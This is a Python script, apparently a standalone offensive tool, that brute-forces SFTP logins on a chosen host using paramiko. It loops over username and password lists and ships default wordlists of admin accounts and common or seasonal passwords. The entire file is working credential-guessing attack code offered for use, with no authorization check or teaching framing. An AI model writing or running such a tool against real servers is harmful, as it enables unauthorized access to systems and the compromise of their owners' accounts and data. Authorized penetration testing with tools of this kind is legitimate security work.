#!/usr/bin/env python3
#
# Author: Vahe
# Description: 
#   This Python script performs brute-force authentication testing against SFTP servers.
#   It systematically iterates through provided or default lists of usernames and passwords
#   to identify valid login credentials. Features include command-line options for specifying
#   custom usernames/password files, detailed logging of authentication attempts, and error
#   handling to gracefully manage network and authentication errors.
#
# Usage:
#   python sftp_brute.py <target_host> [-p port] [-U userfile] [-u username] [-P passfile]
#
# Requirements:
#   paramiko
import paramiko
import socket
import argparse

def sftp_bruteforce(target, port, user_list, pass_list):
    """
    Iterates over username and password lists to attempt SFTP authentication.
    Returns the successful username and password or (None, None) if no valid credentials are found.
    """
    for user in user_list:
        for password in pass_list:
            print(f"[*] Trying {user}:{password} ...")
            try:
                transport = paramiko.Transport((target, port))
                transport.connect(username=user, password=password)
                # Attempt to open an SFTP session to verify successful authentication
                sftp = paramiko.SFTPClient.from_transport(transport)
                print(f"[+] Success! Valid credentials found: {user}:{password}")
                sftp.close()
                transport.close()
                return user, password
            except paramiko.AuthenticationException:
                print(f"[-] Authentication failed for {user}:{password}")
            except socket.error as e:
                print(f"[-] Socket error while connecting: {e}")
            except Exception as e:
                print(f"[-] Error for {user}:{password} -> {e}")
            finally:
                try:
                    transport.close()
                except Exception:
                    pass
    return None, None

def main():
    parser = argparse.ArgumentParser(description="SFTP Bruteforce Script with Default Wordlists")
    parser.add_argument("target", help="Target hostname or IP address")
    parser.add_argument("-p", "--port", type=int, default=22, help="SFTP port (default: 22)")
    parser.add_argument("-U", "--userfile", help="File containing list of usernames (optional)")
    parser.add_argument("-u", "--username", help="Single username to test (overrides username file and default list)")
    parser.add_argument("-P", "--passfile", help="File containing list of passwords (optional)")
    args = parser.parse_args()

    # Determine username list
    if args.username:
        user_list = [args.username]
        print(f"[*] Using single username: {args.username}")
    elif args.userfile:
        try:
            with open(args.userfile, "r") as uf:
                user_list = [line.strip() for line in uf if line.strip()]
            print(f"[*] Loaded {len(user_list)} usernames from {args.userfile}")
        except Exception as e:
            print(f"[-] Error reading username file: {e}")
            return
    else:
        # Default common usernames for SFTP servers
        user_list = ["root", "admin", "user", "guest", "ftp", "test"]
        print("[*] Using default username list.")

    # Determine password list
    if args.passfile:
        try:
            with open(args.passfile, "r") as pf:
                pass_list = [line.strip() for line in pf if line.strip()]
            print(f"[*] Loaded {len(pass_list)} passwords from {args.passfile}")
        except Exception as e:
            print(f"[-] Error reading password file: {e}")
            return
    else:
        # Expanded default password list with common passwords, seasonal variants, and popular patterns
        pass_list = [
            "password", "123456", "12345678", "123456789", "12345", "1234567", "qwerty", "abc123", "password1", 
            "admin", "admin123", "letmein", "monkey", "dragon", "football", "iloveyou", "passw0rd", "trustno1",
            "welcome", "welcome1", "welcome12",
            "summer2021", "Summer2021", "winter2021", "Winter2021", "spring2021", "Spring2021", "autumn2021", "Autumn2021",
            "summer2022", "Summer2022", "winter2022", "Winter2022", "spring2022", "Spring2022", "autumn2022", "Autumn2022",
            "summer2023", "Summer2023", "winter2023", "Winter2023", "spring2023", "Spring2023", "autumn2023", "Autumn2023",
            "summer2024", "Summer2024", "winter2024", "Winter2024", "spring2024", "Spring2024", "autumn2024", "Autumn2024",
            "summer2025", "Summer2025", "winter2025", "Winter2025", "spring2025", "Spring2025", "autumn2025", "Autumn2025",
            "welcome2021", "welcome2022", "welcome2023", "welcome2024", "welcome2025"
        ]
        print("[*] Using default password list.")

    print(f"[+] Starting SFTP bruteforce on {args.target}:{args.port}")
    valid_user, valid_pass = sftp_bruteforce(args.target, args.port, user_list, pass_list)
    if valid_user:
        print(f"[+] Valid credentials found: {valid_user}:{valid_pass}")
    else:
        print("[-] No valid credentials found.")

if __name__ == "__main__":
    main()
